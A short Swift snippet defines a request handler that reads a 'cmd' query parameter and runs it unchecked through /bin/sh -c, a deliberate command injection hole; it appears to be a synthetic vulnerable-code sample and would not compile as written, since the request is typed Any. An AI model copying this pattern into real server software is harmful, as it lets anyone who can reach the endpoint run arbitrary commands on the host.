import Foundation

func handler(request: Any, stmt: Any) throws {
    let cmd = request.query["cmd"]!
    Process.launchedProcess(launchPath: "/bin/sh", arguments: ["-c", cmd])
}
